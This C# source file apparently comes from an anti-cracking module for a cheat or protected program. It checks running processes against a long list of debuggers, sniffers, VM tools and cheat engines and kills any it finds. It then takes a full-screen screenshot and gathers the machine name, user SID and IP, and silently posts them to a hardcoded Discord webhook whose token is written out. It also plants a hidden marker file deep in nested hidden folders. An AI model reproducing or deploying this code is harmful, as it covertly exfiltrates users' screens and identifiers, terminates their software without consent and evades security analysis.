using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Principal;

namespace BanCracker
{
    public static class crackMe
    {
        private static readonly HttpClient client = new HttpClient();
        public static void OnScanTimerTick(object state)
        {
            ScanAndExitIfNeeded();
        }

        private static async void ScanAndExitIfNeeded()
        {
            string[] processesToCheck =
            {
                "ollydbg", "ProcessHacker", "Dump-Fixer", "kdstinker",
                "tcpview", "autoruns", "autorunsc", "filemon", "procmon",
                "regmon", "procexp", "ImmunityDebugger", "Wireshark",
                "dumpcap", "HookExplorer", "ImportREC", "PETools", "LordPE",
                "SysInspector", "proc_analyzer", "sysAnalyzer",
                "sniff_hit", "windbg", "joeboxcontrol", "Fiddler", "joeboxserver",
                "ida64", "ida", "idaq64", "Vmtoolsd", "Vmwaretrat",
                "Vmwareuser", "Vmacthlp", "vboxservice", "vboxtray", "ReClass.NET",
                "x64dbg", "OLLYDBG", "Cheat Engine","Lunar Engine", "cheatengine-x86_64-SSE4-AVX2",
                "MugenJinFuu-i386", "Mugen JinFuu", "MugenJinFuu-x86_64-SSE4-AVX2", "MugenJinFuu-x86_64",
                "KsDumper", "dnSpy", "cheatengine-i386", "cheatengine-x86_64", "Fiddler Everywhere",
                "HTTPDebuggerSvc", "Fiddler.WebUi", "createdump","lunarengine-x86_64-SSE4-AVX2"
            };

            List<string> detectedProcesses = new List<string>();

            foreach (string process in processesToCheck)
            {
                if (CheckProcess(process))
                {
                    detectedProcesses.Add(process);
                    KillProcessByName(process);
                }
            }

            if (detectedProcesses.Count > 0)
            {
                string detectedSoftwares = string.Join("\n", detectedProcesses);
                string pcName = GetPCName();
                string hwid = GetHWID();
                string ip = GetIPAddress();
                string screenshotPath = CaptureScreenshot();
                await SendToWebhook(pcName, hwid, ip, screenshotPath, detectedSoftwares);
                BanCrackerFile();
                Environment.Exit(0);
            }
        }

        private static bool CheckProcess(string processName)
        {
            try
            {
                return Process.GetProcessesByName(processName).Length > 0;
            }
            catch
            {
                return false;
            }
        }

        private static void KillProcessByName(string processName)
        {
            try
            {
                foreach (var process in Process.GetProcessesByName(processName))
                {
                    try
                    {
                        process.Kill();
                        process.WaitForExit();
                    }
                    finally
                    {
                        process.Dispose();
                    }
                }
            }
            catch
            {

            }
        }

        private static string GetPCName() => Environment.MachineName;

        private static string GetHWID()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                return identity.User?.Value;
           
            }
            catch { }
            return "HWID_Error";
        }

        private static string GetIPAddress()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch { }
            return "IP_Error";
        }

        private static string CaptureScreenshot()
        {
            string screenshotPath = Path.Combine(Path.GetTempPath(), "screenshot.png");
            try
            {
                using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (Graphics graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                    }
                    bitmap.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);
                }
            }
            catch
            {
                screenshotPath = "Screenshot_Error";
            }
            return screenshotPath;
        }

        private static async Task SendToWebhook(string pcName, string hwid, string ip, string screenshotPath, string detectedSoftwares)
        {
            try
            {
                string webhookUrl = "https://discord.com/api/webhooks/1277173946948648996/tYAGLTy15r3g7-zFd5C7M1s6BU7ZmWUzyMQoBH7a4byOSBwCavdyN3IGLQAMdgT-Dxcc";
                var multipartForm = new MultipartFormDataContent();
                var embed = new
                {
                    embeds = new[]
                    {
                new
                {
                    title = "**Cracker Detected!**",
                    description = "A suspicious activity has been identified and logged. Details are provided below:\n",
                    color = 0x808080,
                    fields = new[]
                    {
                        new
                        {
                            name = "**PC Name**",
                            value = $"{pcName}",
                            inline = false
                        },
                        new
                        {
                            name = "**IP Address**",
                            value = $"{ip}",
                            inline = false
                        },
                        new
                        {
                            name = "**HWID**",
                            value = $"{hwid}",
                            inline = true
                        },
                        new
                        {
                            name = "**Detected Softwares**",
                            value = $"{detectedSoftwares}",
                            inline = false
                        }
                    },
                    image = new { url = "attachment://screenshot.png" },
                    footer = new { text = "aimguardexe.nexx | Stay Secure", icon_url = "https://i.pinimg.com/736x/5b/6b/5f/5b6b5f607644660f850b6b9d1817605b.jpg" },
                    timestamp = DateTime.UtcNow.ToString("o")
                }
            }
                };
                string jsonEmbed = Newtonsoft.Json.JsonConvert.SerializeObject(embed);
                multipartForm.Add(new StringContent(jsonEmbed, Encoding.UTF8, "application/json"), "payload_json");
                if (File.Exists(screenshotPath))
                {
                    var fileContent = new ByteArrayContent(File.ReadAllBytes(screenshotPath));
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                    multipartForm.Add(fileContent, "file", "screenshot.png");
                }
                await client.PostAsync(webhookUrl, multipartForm);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending webhook: {ex.Message}");
            }
        }

        private static void BanCrackerFile()
        {
            string baseDir = @"C:\ProgramData";
            string currentDir = baseDir;

            for (int i = 1; i <= 10; i++)
            {
                currentDir = Path.Combine(currentDir, $"folder{i}");
                if (!Directory.Exists(currentDir))
                {
                    Directory.CreateDirectory(currentDir);
                    File.SetAttributes(currentDir, FileAttributes.Hidden);
                }
            }

            string filePath = Path.Combine(currentDir, "NexxSpy.pxz");
            if (!File.Exists(filePath))
            {
                File.WriteAllText(filePath, "Hello dear! You are banned");
                File.SetAttributes(filePath, FileAttributes.Hidden);
            }
        }
    }
}
